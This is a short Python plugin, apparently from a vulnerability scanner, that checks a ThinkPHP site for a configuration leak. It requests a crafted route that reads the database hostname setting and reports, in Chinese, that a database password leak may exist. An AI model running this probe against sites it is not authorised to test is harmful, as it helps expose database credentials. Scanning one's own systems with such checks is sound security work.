#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings()
class ThinkDBScan:
    def run(self, urls):
        try:
            url = urls + '/?s=index/think\config/get&name=database.hostname'
            response = requests.get(url,headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)
            if response.status_code == 200 and response.url == url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在数据库密码泄漏')
                OutPrintInfo("ThinkPHP", url)

            else:
                OutPrintInfo("ThinkPHP", '不存在数据库密码泄漏')
                pass
        except Exception:
            pass

    def main(self, target):
        OutPrintInfo("ThinkPHP", '开始检测配置文件泄漏...')
        url = target[0].strip('/ ')
        self.ssl = target[1]
        header = target[2]
        proxy = target[3]
        self.timeout = int(target[4])
        req = ReqSet(header=header,proxy=proxy)
        self.headers = req["header"]
        self.proxy = req["proxy"]

        self.run(url)

        OutPrintInfo("ThinkPHP", '配置文件泄漏检测结束')